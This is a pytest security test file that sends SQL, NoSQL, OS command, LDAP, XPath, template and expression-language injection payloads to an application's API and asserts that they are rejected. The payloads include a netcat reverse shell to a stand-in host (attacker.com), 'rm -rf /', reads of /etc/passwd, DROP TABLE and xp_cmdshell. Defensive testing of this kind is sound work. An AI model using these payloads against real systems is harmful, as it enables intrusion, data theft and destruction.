"""
Injection Attack Security Tests
================================

Comprehensive testing for various injection attack vectors:
- SQL Injection (SQLi)
- NoSQL Injection
- Command Injection (OS Command Injection)
- LDAP Injection
- XPath Injection
- Template Injection
- Expression Language Injection

These tests validate that the application properly sanitizes and validates
all user inputs to prevent injection attacks.
"""

import pytest
import re
from typing import List, Dict, Any
from unittest.mock import Mock, patch, MagicMock
import subprocess
import xml.etree.ElementTree as ET


class TestSQLInjection:
    """
    SQL Injection Attack Tests
    
    Tests various SQL injection techniques including:
    - Classic SQLi (UNION-based)
    - Boolean-based blind SQLi
    - Time-based blind SQLi
    - Error-based SQLi
    - Stacked queries
    """
    
    def test_classic_sql_injection_authentication_bypass(self, client):
        """Test authentication bypass via SQL injection"""
        sql_payloads = [
            "admin' --",
            "admin'#",
            "' OR '1'='1",
            "' OR 1=1--",
            "admin' OR '1'='1'--",
            "') OR ('1'='1",
            "' OR 'x'='x",
            "1' OR '1' = '1'/*"
        ]
        
        for payload in sql_payloads:
            response = client.post('/api/v1/auth/login', json={
                'username': payload,
                'password': 'anything'
            })
            
            # Should not allow authentication
            assert response.status_code in [400, 401, 422], \
                f"SQL injection payload bypassed auth: {payload}"
            
            # Should not return valid token
            data = response.get_json() or {}
            assert 'token' not in data or not data.get('token'), \
                f"SQL injection returned valid token: {payload}"
    
    def test_union_based_sql_injection(self, client, user_token):
        """Test UNION-based SQL injection for data exfiltration"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        union_payloads = [
            "1' UNION SELECT NULL, NULL, NULL--",
            "1' UNION SELECT username, password, email FROM users--",
            "1' UNION ALL SELECT table_name, NULL FROM information_schema.tables--",
            "1' UNION SELECT @@version, NULL, NULL--",
            "1' UNION SELECT load_file('/etc/passwd'), NULL--"
        ]
        
        for payload in union_payloads:
            response = client.get(f'/api/v1/users/{payload}', headers=headers)
            
            # Should not return union query results
            assert response.status_code in [400, 404, 422], \
                f"UNION injection not prevented: {payload}"
            
            if response.status_code == 200:
                data = response.get_json()
                # Check for signs of successful injection
                assert not self._contains_multiple_result_sets(data), \
                    f"UNION query executed: {payload}"
    
    def test_boolean_blind_sql_injection(self, client, user_token):
        """Test boolean-based blind SQL injection"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        # Payloads that would cause different responses if vulnerable
        true_payloads = [
            "1' AND '1'='1",
            "1' AND 1=1--",
            "1' AND 'a'='a"
        ]
        
        false_payloads = [
            "1' AND '1'='2",
            "1' AND 1=2--",
            "1' AND 'a'='b"
        ]
        
        true_responses = []
        false_responses = []
        
        for payload in true_payloads:
            response = client.get(f'/api/v1/products?id={payload}', 
                                headers=headers)
            true_responses.append(response.status_code)
        
        for payload in false_payloads:
            response = client.get(f'/api/v1/products?id={payload}', 
                                headers=headers)
            false_responses.append(response.status_code)
        
        # Responses should be the same (input sanitized) or all errors
        assert len(set(true_responses + false_responses)) <= 2, \
            "Boolean blind SQLi may be possible"
    
    def test_time_based_blind_sql_injection(self, client, user_token):
        """Test time-based blind SQL injection"""
        import time
        
        headers = {'Authorization': f'Bearer {user_token}'}
        
        time_payloads = [
            "1' AND SLEEP(5)--",
            "1'; WAITFOR DELAY '00:00:05'--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1'; SELECT pg_sleep(5)--"
        ]
        
        for payload in time_payloads:
            start_time = time.time()
            response = client.get(f'/api/v1/users?search={payload}',
                                headers=headers)
            elapsed = time.time() - start_time
            
            # Should not cause delay
            assert elapsed < 2.0, \
                f"Time-based SQLi may work: {payload} (took {elapsed}s)"
    
    def test_error_based_sql_injection(self, client, user_token):
        """Test error-based SQL injection"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        error_payloads = [
            "1' AND 1=CONVERT(int, (SELECT @@version))--",
            "1' AND extractvalue(1, concat(0x7e, (SELECT user())))--",
            "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@version), 0x7e, FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) y)--",
        ]
        
        for payload in error_payloads:
            response = client.get(f'/api/v1/search?q={payload}',
                                headers=headers)
            
            if response.status_code >= 500:
                error_msg = response.get_json().get('message', '')
                
                # Error should not reveal SQL details
                assert not self._contains_sql_error_info(error_msg), \
                    f"SQL error details exposed: {payload}"
    
    def test_stacked_queries_sql_injection(self, client, admin_token):
        """Test stacked queries SQL injection"""
        headers = {'Authorization': f'Bearer {admin_token}'}
        
        stacked_payloads = [
            "1'; DROP TABLE users--",
            "1'; DELETE FROM users WHERE '1'='1'--",
            "1'; UPDATE users SET role='admin' WHERE id=1--",
            "1'; INSERT INTO users (username, role) VALUES ('hacker', 'admin')--",
            "1'; EXEC xp_cmdshell('whoami')--"
        ]
        
        for payload in stacked_payloads:
            response = client.post('/api/v1/admin/execute',
                                  headers=headers,
                                  json={'query': payload})
            
            # Should not allow stacked queries
            assert response.status_code in [400, 403, 422], \
                f"Stacked query not prevented: {payload}"
    
    def test_second_order_sql_injection(self, client, user_token):
        """Test second-order SQL injection"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        # Store malicious payload
        payload = "admin'--"
        response = client.post('/api/v1/profile/update',
                              headers=headers,
                              json={'bio': payload})
        
        # Retrieve and use the data (where injection might occur)
        response = client.get('/api/v1/profile', headers=headers)
        
        # Should handle stored data safely
        assert response.status_code == 200
        data = response.get_json()
        
        # Payload should be stored as-is but not executed
        assert data.get('bio') == payload
    
    @staticmethod
    def _contains_multiple_result_sets(data: Any) -> bool:
        """Check if response contains multiple result sets"""
        if isinstance(data, list) and len(data) > 1:
            # Check for suspicious structure
            return any(isinstance(item, list) for item in data)
        return False
    
    @staticmethod
    def _contains_sql_error_info(message: str) -> bool:
        """Check if error message reveals SQL information"""
        sql_indicators = [
            'syntax error',
            'mysql',
            'postgresql',
            'sqlite',
            'oracle',
            'table',
            'column',
            'database',
            'sql',
            'query',
            'syntax'
        ]
        message_lower = message.lower()
        return any(indicator in message_lower for indicator in sql_indicators)


class TestNoSQLInjection:
    """
    NoSQL Injection Attack Tests
    
    Tests injection attacks specific to NoSQL databases:
    - MongoDB operator injection
    - JavaScript injection
    - Where clause injection
    """
    
    def test_mongodb_operator_injection_authentication(self, client):
        """Test MongoDB operator injection in authentication"""
        nosql_payloads = [
            {'$gt': ''},
            {'$ne': None},
            {'$nin': []},
            {'$regex': '.*'},
            {'$where': '1==1'}
        ]
        
        for payload in nosql_payloads:
            response = client.post('/api/v1/auth/login', json={
                'username': payload,
                'password': payload
            })
            
            # Should reject operator injection
            assert response.status_code in [400, 401, 422], \
                f"NoSQL operator injection not prevented: {payload}"
    
    def test_mongodb_where_clause_injection(self, client, user_token):
        """Test $where clause JavaScript injection"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        where_payloads = [
            {'$where': 'this.password'},
            {'$where': 'function() { return true; }'},
            {'$where': 'sleep(5000)'},
            {'$where': 'db.users.find()'}
        ]
        
        for payload in where_payloads:
            response = client.post('/api/v1/users/search',
                                  headers=headers,
                                  json={'filter': payload})
            
            # Should block $where clauses
            assert response.status_code in [400, 422], \
                f"$where injection not prevented: {payload}"
    
    def test_mongodb_json_injection(self, client, user_token):
        """Test JSON structure manipulation"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        # Try to inject additional fields
        malicious_json = {
            'username': 'testuser',
            '$set': {'role': 'admin'},
            '$unset': {'suspended': ''}
        }
        
        response = client.put('/api/v1/users/me',
                             headers=headers,
                             json=malicious_json)
        
        # Should reject operator fields
        assert response.status_code in [400, 422], \
            "MongoDB operator in JSON not sanitized"
        
        # Verify role wasn't changed
        profile = client.get('/api/v1/users/me', headers=headers)
        assert profile.get_json().get('role') != 'admin'
    
    def test_nosql_blind_injection(self, client, user_token):
        """Test blind NoSQL injection via regex"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        # Try to extract admin password character by character
        regex_payloads = [
            {'username': {'$regex': '^a.*'}},
            {'username': {'$regex': '^admin.*', '$options': 'i'}},
            {'password': {'$regex': '.*'}},
        ]
        
        for payload in regex_payloads:
            response = client.post('/api/v1/users/search',
                                  headers=headers,
                                  json={'filter': payload})
            
            # Should validate/sanitize regex patterns
            assert response.status_code in [400, 422], \
                f"Regex injection not prevented: {payload}"


class TestCommandInjection:
    """
    Command Injection Attack Tests
    
    Tests OS command injection through various attack vectors:
    - Shell metacharacters
    - Command chaining
    - Command substitution
    """
    
    def test_basic_command_injection(self, client, admin_token):
        """Test basic OS command injection"""
        headers = {'Authorization': f'Bearer {admin_token}'}
        
        command_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "& whoami",
            "&& id",
            "|| uname -a",
            "`whoami`",
            "$(whoami)",
            "; rm -rf /",
            "| nc attacker.com 4444 -e /bin/bash"
        ]
        
        for payload in command_payloads:
            response = client.post('/api/v1/system/ping',
                                  headers=headers,
                                  json={'host': f'127.0.0.1{payload}'})
            
            # Should sanitize or reject
            assert response.status_code in [400, 403, 422], \
                f"Command injection not prevented: {payload}"
    
    def test_command_injection_via_file_operations(self, client, user_token):
        """Test command injection via file operations"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        file_payloads = [
            "file.txt; cat /etc/passwd",
            "file.txt | whoami",
            "`whoami`.txt",
            "$(ls).txt"
        ]
        
        for payload in file_payloads:
            response = client.post('/api/v1/files/process',
                                  headers=headers,
                                  json={'filename': payload})
            
            # Should sanitize filename
            assert response.status_code in [400, 422], \
                f"Filename command injection not prevented: {payload}"
    
    def test_command_injection_newline_characters(self, client, admin_token):
        """Test command injection using newline characters"""
        headers = {'Authorization': f'Bearer {admin_token}'}
        
        newline_payloads = [
            "input\ncat /etc/passwd",
            "input%0Awhoami",
            "input\r\nid",
            "input%0D%0Aid"
        ]
        
        for payload in newline_payloads:
            response = client.post('/api/v1/system/execute',
                                  headers=headers,
                                  json={'input': payload})
            
            assert response.status_code in [400, 403], \
                f"Newline command injection not prevented: {payload}"
    
    def test_environment_variable_injection(self, client, admin_token):
        """Test injection via environment variables"""
        headers = {'Authorization': f'Bearer {admin_token}'}
        
        env_payloads = [
            "${PATH}",
            "$HOME",
            "${IFS}cat${IFS}/etc/passwd",
            "$(printenv)"
        ]
        
        for payload in env_payloads:
            response = client.post('/api/v1/system/process',
                                  headers=headers,
                                  json={'value': payload})
            
            assert response.status_code in [400, 422], \
                f"Environment variable injection not prevented: {payload}"
    
    def test_shellshock_attack(self, client, admin_token):
        """Test Shellshock (Bash vulnerability) attack"""
        headers = {'Authorization': f'Bearer {admin_token}'}
        
        shellshock_payloads = [
            "() { :; }; /bin/cat /etc/passwd",
            "() { :; }; /bin/bash -c 'whoami'",
            "() { _; } >_[$($())] { echo vulnerable; }"
        ]
        
        for payload in shellshock_payloads:
            # Try to inject via headers (common Shellshock vector)
            response = client.get('/api/v1/system/status',
                                 headers={
                                     **headers,
                                     'User-Agent': payload
                                 })
            
            # Should not execute shellshock payload
            assert response.status_code in [200, 400, 403]
            if response.status_code == 200:
                data = response.get_json()
                assert 'vulnerable' not in str(data).lower()


class TestLDAPInjection:
    """
    LDAP Injection Attack Tests
    
    Tests LDAP injection through various query manipulation techniques
    """
    
    def test_ldap_authentication_bypass(self, client):
        """Test LDAP authentication bypass"""
        ldap_payloads = [
            "*",
            "*)(&",
            "*)(uid=*))(|(uid=*",
            "admin)(&(password=*))",
            "*)(objectClass=*"
        ]
        
        for payload in ldap_payloads:
            response = client.post('/api/v1/auth/ldap',
                                  json={
                                      'username': payload,
                                      'password': 'anything'
                                  })
            
            assert response.status_code in [400, 401, 422], \
                f"LDAP injection not prevented: {payload}"
    
    def test_ldap_filter_injection(self, client, user_token):
        """Test LDAP filter manipulation"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        filter_payloads = [
            "*)(%26(password=*)",
            "*)(|(objectClass=*))",
            "*))%00",
            "admin*)(|(password=*"
        ]
        
        for payload in filter_payloads:
            response = client.get(f'/api/v1/ldap/users?filter={payload}',
                                headers=headers)
            
            assert response.status_code in [400, 404, 422], \
                f"LDAP filter injection not prevented: {payload}"
    
    def test_ldap_dn_injection(self, client, user_token):
        """Test LDAP Distinguished Name injection"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        dn_payloads = [
            "cn=admin,ou=*",
            "cn=*,dc=*",
            "cn=test)(cn=admin",
        ]
        
        for payload in dn_payloads:
            response = client.get(f'/api/v1/ldap/search?dn={payload}',
                                headers=headers)
            
            assert response.status_code in [400, 422], \
                f"LDAP DN injection not prevented: {payload}"


class TestXPathInjection:
    """
    XPath Injection Attack Tests
    
    Tests XPath injection in XML queries
    """
    
    def test_xpath_authentication_bypass(self, client):
        """Test XPath authentication bypass"""
        xpath_payloads = [
            "' or '1'='1",
            "' or ''='",
            "x' or 1=1 or 'x'='y",
            "admin' or '1'='1'--"
        ]
        
        for payload in xpath_payloads:
            response = client.post('/api/v1/auth/xml',
                                  json={
                                      'username': payload,
                                      'password': 'test'
                                  })
            
            assert response.status_code in [400, 401, 422], \
                f"XPath injection not prevented: {payload}"
    
    def test_xpath_node_injection(self, client, user_token):
        """Test XPath node selection manipulation"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        node_payloads = [
            "']|//password|//*[name()='",
            "' or name()='password' or ''='",
            "//user[password]",
            "..//password"
        ]
        
        for payload in node_payloads:
            response = client.get(f'/api/v1/xml/query?xpath={payload}',
                                headers=headers)
            
            assert response.status_code in [400, 422], \
                f"XPath node injection not prevented: {payload}"
    
    def test_xpath_blind_injection(self, client, user_token):
        """Test blind XPath injection"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        # Test for boolean conditions
        true_payload = "user[1] and '1'='1'"
        false_payload = "user[1] and '1'='2'"
        
        response_true = client.get(f'/api/v1/xml/search?q={true_payload}',
                                  headers=headers)
        response_false = client.get(f'/api/v1/xml/search?q={false_payload}',
                                   headers=headers)
        
        # Responses should be similar (sanitized input)
        assert response_true.status_code == response_false.status_code, \
            "XPath blind injection may be possible"


class TestTemplateInjection:
    """
    Template Injection Attack Tests
    
    Tests Server-Side Template Injection (SSTI) attacks
    """
    
    def test_jinja2_template_injection(self, client, user_token):
        """Test Jinja2 template injection"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        ssti_payloads = [
            "{{7*7}}",
            "{{config}}",
            "{{request}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{% for item in [].__class__.__base__.__subclasses__() %}{% endfor %}"
        ]
        
        for payload in ssti_payloads:
            response = client.post('/api/v1/render',
                                  headers=headers,
                                  json={'template': payload})
            
            if response.status_code == 200:
                data = response.get_json()
                result = data.get('output', '')
                
                # Should not execute template code
                assert '49' not in result, f"Template injection executed: {payload}"
                assert 'class' not in result.lower(), f"Object access in template: {payload}"
    
    def test_freemarker_template_injection(self, client, user_token):
        """Test FreeMarker template injection"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        freemarker_payloads = [
            "${7*7}",
            "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
            "${\"freemarker.template.utility.ObjectConstructor\"?new()}",
        ]
        
        for payload in freemarker_payloads:
            response = client.post('/api/v1/template/render',
                                  headers=headers,
                                  json={'content': payload})
            
            assert response.status_code in [400, 422], \
                f"FreeMarker injection not prevented: {payload}"
    
    def test_erb_template_injection(self, client, user_token):
        """Test ERB (Ruby) template injection"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        erb_payloads = [
            "<%= 7*7 %>",
            "<%= `whoami` %>",
            "<%= system('id') %>",
            "<%= File.read('/etc/passwd') %>"
        ]
        
        for payload in erb_payloads:
            response = client.post('/api/v1/email/template',
                                  headers=headers,
                                  json={'body': payload})
            
            if response.status_code == 200:
                data = response.get_json()
                # Should not execute code
                assert '49' not in str(data), f"ERB injection executed: {payload}"


class TestExpressionLanguageInjection:
    """
    Expression Language Injection Tests
    
    Tests injection in expression languages (EL, OGNL, SpEL)
    """
    
    def test_spring_expression_language_injection(self, client, user_token):
        """Test Spring Expression Language (SpEL) injection"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        spel_payloads = [
            "${7*7}",
            "#{7*7}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "#{T(java.lang.System).getProperty('user.name')}"
        ]
        
        for payload in spel_payloads:
            response = client.post('/api/v1/evaluate',
                                  headers=headers,
                                  json={'expression': payload})
            
            assert response.status_code in [400, 422], \
                f"SpEL injection not prevented: {payload}"
    
    def test_ognl_injection(self, client, user_token):
        """Test OGNL (Object-Graph Navigation Language) injection"""
        headers = {'Authorization': f'Bearer {user_token}'}
        
        ognl_payloads = [
            "@java.lang.Runtime@getRuntime().exec('whoami')",
            "(#cmd='whoami')(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))",
            "@java.lang.System@getProperty('user.name')"
        ]
        
        for payload in ognl_payloads:
            response = client.post('/api/v1/process',
                                  headers=headers,
                                  json={'expression': payload})
            
            assert response.status_code in [400, 422], \
                f"OGNL injection not prevented: {payload}"


# Fixtures

@pytest.fixture
def client():
    """Create test client"""
    from samplemind.app import create_app
    app = create_app('testing')
    return app.test_client()


@pytest.fixture
def user_token():
    """Create JWT token for regular user"""
    from samplemind.auth.jwt import create_access_token
    return create_access_token({'user_id': 1, 'role': 'user'})


@pytest.fixture
def admin_token():
    """Create JWT token for admin user"""
    from samplemind.auth.jwt import create_access_token
    return create_access_token({'user_id': 1, 'role': 'admin'})


if __name__ == '__main__':
    pytest.main([__file__, '-v'])